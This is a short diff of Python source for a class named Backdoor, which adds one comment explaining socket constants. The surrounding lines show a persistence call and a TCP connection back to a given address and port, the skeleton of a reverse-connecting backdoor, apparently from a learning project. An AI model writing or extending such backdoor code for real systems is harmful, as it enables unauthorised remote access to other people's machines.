@@ -10,6 +10,7 @@ import shutil
 class Backdoor:
     def __init__(self, ip, port):
         self.become_persistent()
+        #AF_INET if for ipv4 add and SOCK_STREAM for TCP
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip,port))
         
